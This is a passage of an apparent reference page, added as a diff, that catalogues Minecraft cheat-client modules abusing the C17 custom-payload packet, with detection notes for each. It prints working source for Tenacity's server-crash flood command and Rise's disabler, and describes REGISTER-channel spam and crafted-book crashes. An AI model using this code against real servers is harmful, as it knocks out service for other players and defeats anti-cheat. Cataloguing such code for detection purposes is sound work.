+// NOTE (AI): ChannelConsoleSpammer is a Mode of the Rise 6.x ConsoleSpammer. Every tick it sends up to channelsPerTick REGISTER packets, each carrying a random 'MC|' + 8-16 random letters channel name. The payload is a registration for channels the client never uses; the spam is aimed at server consoles and plugin channel registries that log or allocate per REGISTER.</code></div><button class="code-expand-btn" onclick="var w=this.parentNode;w.classList.toggle('collapsed');w.classList.toggle('expanded');this.querySelector('.expand-label').textContent=w.classList.contains('collapsed')?'Show more':'Show less'"><svg class="expand-icon-collapsed" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"/></svg><svg class="expand-icon-expanded" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="18 15 12 9 6 15"/></svg><span class="expand-label">Show more</span></button></div>
+<div class="impl-meta"><span><strong>Vanilla hook:</strong> TickEvent.</span></div>
+<div class="impl-meta" style="color:var(--orange);margin-top:4px"><span>Detectable by rate limits on REGISTER and by channel-registry memory accounting; it is a console nuisance, not a movement exploit.</span></div>
+<div class="impl-meta" style="margin-top:4px"><span><strong>Variations:</strong> Same Mode in Rise 6.1.30.</span></div>
+</div>
+<div class="impl-module-entry"><div class="impl-module-header"><span class="impl-module-name">Crasher (BEdit / Mare)</span>
+<span class="impl-module-clients">(Rise 5.99, Tenacity 6.0)</span>
+</div>
+<p class="impl-pattern">Push crafted book NBT over the MC|BEdit channel to crash servers with unpatched book parsers.</p>
+<p class="impl-pattern" style="font-size:0.8rem;color:var(--text-muted)">Rise 5.99's BEdit mode sends 30 MC|BEdit payloads whose book pages are deeply nested {extra:[{...}} JSON; Mare mode repeats the same construction packets.getValue() times. Tenacity's CrasherCommand floods a fixed C17 with repeated U+1D11E bytes.</p>
+<p class="impl-meta" style="font-size:0.75rem"><span><strong>Source:</strong> Tenacity 6.0 — dev/tenacity/command/impl/CrasherCommand.java</span></p>
+<div class="impl-code-wrap collapsed"><div class="impl-code"><code>// ===== FILE: Tenacity 6.0 — dev/tenacity/command/impl/CrasherCommand.java =====
+package dev.tenacity.command.impl;
+
+import dev.tenacity.Tenacity;
+import dev.tenacity.command.AbstractCommand;
+import dev.tenacity.exception.UnknownModuleException;
+import dev.tenacity.module.Module;
+import dev.tenacity.util.misc.ChatUtil;
+import io.netty.buffer.Unpooled;
+import net.minecraft.network.PacketBuffer;
+import net.minecraft.network.play.client.C17PacketCustomPayload;
+import org.lwjgl.input.Keyboard;
+
+import java.nio.charset.StandardCharsets;
+
+import static dev.tenacity.util.Utils.mc;
+
+public final class CrasherCommand extends AbstractCommand {
+
+    public CrasherCommand() {
+        super("crash", "Sends packets to crash a server", ".crash (packet amount) (packet value or mn)", 2);
+    }
+
+    @Override
+    public void onCommand(final String[] arguments) {
+        String channelName = "bluetooth cum";
+        String payload = "\uD834\uDD1E\uD834\uDD1E\uD834\uDD1E\uD834\uDD1E\uD834\uDD1E\uD834\uDD1E\uD834\uDD1E";
+        byte[] payloadBytes = payload.getBytes(StandardCharsets.UTF_8);
+        PacketBuffer packetBuffer = new PacketBuffer(Unpooled.buffer());
+
+        packetBuffer.writeBytes(payloadBytes);
+        if (arguments.length &gt; 0 &amp;&amp; arguments[0].equalsIgnoreCase("mn")) {
+            sendStringPayload(channelName, payload);
+        } else {
+            int packetCount = 1;
+            if (arguments.length &gt; 0) {
+                try {
+                    packetCount = Integer.parseInt(arguments[0]);
+                } catch (NumberFormatException e) {
+                    ChatUtil.error("Invalid packet amount. Defaulting to 1.");
+                }
+            }
+            ChatUtil.enable("Sending " + packetCount + " packets!");
+            for (int i = 0; i &lt; packetCount; i++) {
+                C17PacketCustomPayload customPacket = new C17PacketCustomPayload(channelName, packetBuffer);
+                mc.thePlayer.sendQueue.addToSendQueue(customPacket);
+                ChatUtil.success("Packet sent!");
+            }
+        }
+    }
+    private void sendStringPayload(String channelName, String payload) {
+
+    }
+}
+// NOTE (AI): CrasherCommand implements '.crash (amount) (mn)'. The default path builds a C17 with channel name 'bluetooth cum' and a payload of repeated U+1D11E musical-symbol bytes, then pushes packetCount copies through the vanilla send queue. The payload reuses the same byte sequence for every packet; the 'mn' argument routes to an unimplemented string-payload helper.</code></div><button class="code-expand-btn" onclick="var w=this.parentNode;w.classList.toggle('collapsed');w.classList.toggle('expanded');this.querySelector('.expand-label').textContent=w.classList.contains('collapsed')?'Show more':'Show less'"><svg class="expand-icon-collapsed" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"/></svg><svg class="expand-icon-expanded" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="18 15 12 9 6 15"/></svg><span class="expand-label">Show more</span></button></div>
+<div class="impl-meta"><span><strong>Vanilla hook:</strong> MotionEvent (Tenacity module path), direct send queue (command path), onPreMotion (Rise 5.99).</span></div>
+<div class="impl-meta" style="color:var(--orange);margin-top:4px"><span>The nested-JSON payloads target chat/JSON deserializers; patched servers reject the book NBT via isNBTValid and drop the packet. Rate-based detection is trivial for the 30x flood.</span></div>
+<div class="impl-meta" style="margin-top:4px"><span><strong>Variations:</strong> Rise 5.99 carries both BEdit and Mare in one Crasher module; Tenacity exposes the flood as a chat command with a configurable packet count.</span></div>
+</div>
+<div class="impl-module-entry"><div class="impl-module-header"><span class="impl-module-name">TestDisabler (payload rewrite)</span>
+<span class="impl-module-clients">(Rise 6.2.4)</span>
+</div>
+<p class="impl-pattern">Rewrite every outgoing C17 payload to fixed bytes as a disabler test mode.</p>
+<p class="impl-pattern" style="font-size:0.8rem;color:var(--text-muted)">On PacketSendEvent, replaces the C17 buffer with the raw bytes of the string 'eyser' without cancelling the packet.</p>
+<p class="impl-meta" style="font-size:0.75rem"><span><strong>Source:</strong> Rise 6.2.4 — Client-release2/Client/src/main/java/com/alan/clients/module/impl/exploit/disabler/TestDisabler.java</span></p>
+<div class="impl-code-wrap collapsed"><div class="impl-code"><code>// ===== FILE: Rise 6.2.4 — Client-release2/Client/src/main/java/com/alan/clients/module/impl/exploit/disabler/TestDisabler.java =====
+package com.alan.clients.module.impl.exploit.disabler;
+
+import com.alan.clients.component.impl.player.PingSpoofComponent;
+import com.alan.clients.event.Listener;
+import com.alan.clients.event.annotations.EventLink;
+import com.alan.clients.event.impl.motion.JumpEvent;
+import com.alan.clients.event.impl.motion.PreMotionEvent;
+import com.alan.clients.event.impl.motion.PreUpdateEvent;
+import com.alan.clients.event.impl.other.StepEvent;
+import com.alan.clients.event.impl.packet.PacketSendEvent;
+import com.alan.clients.module.impl.combat.KillAura;
+import com.alan.clients.module.impl.exploit.Disabler;
+import com.alan.clients.util.packet.PacketUtil;
+import com.alan.clients.util.player.MoveUtil;
+import com.alan.clients.value.Mode;
+import io.netty.buffer.Unpooled;
+import net.minecraft.network.Packet;
+import net.minecraft.network.PacketBuffer;
+import net.minecraft.network.play.client.C0FPacketConfirmTransaction;
+import net.minecraft.network.play.client.C17PacketCustomPayload;
+import rip.vantage.commons.util.time.StopWatch;
+
+import java.util.Collection;
+import java.util.HashSet;
+
+public class TestDisabler extends Mode&lt;Disabler&gt; {
+    private final StopWatch stopWatch = new StopWatch();
+
+    private final Collection&lt;Packet&lt;?&gt;&gt; packetCollection = new HashSet&lt;&gt;();
+
+    public TestDisabler(String name, Disabler parent) {
+        super(name, parent);
+    }
+
+    @EventLink()
+    public final Listener&lt;PacketSendEvent&gt; onPacketSend = event -&gt; {
+
+        final Packet&lt;?&gt; packet = event.getPacket();
+
+        if (packet instanceof C17PacketCustomPayload) {
+            final C17PacketCustomPayload wrapper = (C17PacketCustomPayload) packet;
+
+                    // It's meant to be "eyser" don't change itt
+                    wrapper.setData(createPacketBuffer("eyser", false));
+
+
+            }
+
+    };
+
+    private PacketBuffer createPacketBuffer(final String data, final boolean string) {
+        if (string) {
+            return new PacketBuffer(Unpooled.buffer()).writeString(data);
+        } else {
+            return new PacketBuffer(Unpooled.wrappedBuffer(data.getBytes()));
+        }
+    }
+}
+// NOTE (AI): TestDisabler is a Mode of the Rise 6.x Disabler. On PacketSendEvent it rewrites every C17's payload to the raw bytes 'eyser' (the source comment insists on the misspelling), replacing the buffer in place without cancelling the packet. The mode is a test rig for payload rewriting and sits alongside the module's other per-server disabler modes.</code></div><button class="code-expand-btn" onclick="var w=this.parentNode;w.classList.toggle('collapsed');w.classList.toggle('expanded');this.querySelector('.expand-label').textContent=w.classList.contains('collapsed')?'Show more':'Show less'"><svg class="expand-icon-collapsed" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="6 9 12 15 18 9"/></svg><svg class="expand-icon-expanded" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="18 15 12 9 6 15"/></svg><span class="expand-label">Show more</span></button></div>
+<div class="impl-meta"><span><strong>Vanilla hook:</strong> PacketSendEvent.</span></div>
+<div class="impl-meta" style="color:var(--orange);margin-top:4px"><span>Corrupting every C17 breaks the brand handshake and any mod channel traffic, which is obvious to client-detection plugins; the mode is experimental by design.</span></div>
+<div class="impl-meta" style="margin-top:4px"><span><strong>Variations:</strong> Not present in Rise 6.1.30; Rise 6.1.30's VulcanDisabler carries only a commented-out C17 check.</span></div>
+</div>
+<div class="impl-meta" style="margin-top:8px;white-space:pre-wrap">PacketSendEvent for rewrite/cancel (Rise 5.99, Rise 6.x), TickEvent for REGISTER floods, direct send-queue pushes for crash commands (Tenacity).</div>
+<div class="impl-clients">Rise 5.99 mutates the packet in place; Rise 6.x cancels and replays via sendNoEvent; Tenacity pushes raw packets into the vanilla send queue. PingSpoofComponent additionally holds C17 in its blink tuple in both Rise 6.x builds.</div>
+</div>
+<div class="detail-section"><h3>Related Packets</h3><div class="related-list">
+<a class="related-chip" href="../S3FPacketCustomPayload/">S3FPacketCustomPayload</a>
+<a class="related-chip" href="../C19PacketResourcePackStatus/">C19PacketResourcePackStatus</a>
+</div></div>
     </div>
     <div style="margin-top:32px;text-align:center">
       <a href="../../" style="color:var(--accent);font-size:0.85rem">← Back to all packets</a>
